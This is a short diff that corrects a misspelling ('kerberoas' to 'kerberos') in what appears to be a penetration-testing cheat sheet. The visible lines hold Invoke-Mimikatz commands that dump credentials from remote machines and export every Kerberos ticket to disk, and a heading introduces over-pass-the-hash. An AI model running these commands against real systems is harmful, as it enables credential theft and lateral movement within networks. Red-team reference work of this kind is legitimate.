@@ -57,10 +57,10 @@ Invoke-Mimikatz -DumpCreds -ComputerName @("system1","system2")
 
 #Above commands uses PowerShell cmdlet "Invoke-Command" to do their jobs.
 ```
-### Export all kerberoas tickets to disk.
+### Export all Kerberos tickets to disk.
 ```powershell
 #Powersploit module
-Invoke-Mimikatz -command '"kerberoas::list /export"'
+Invoke-Mimikatz -command '"kerberos::list /export"'
 ```
 ### "Over pass the hash" generate tokens from hashes.
 ```powershell
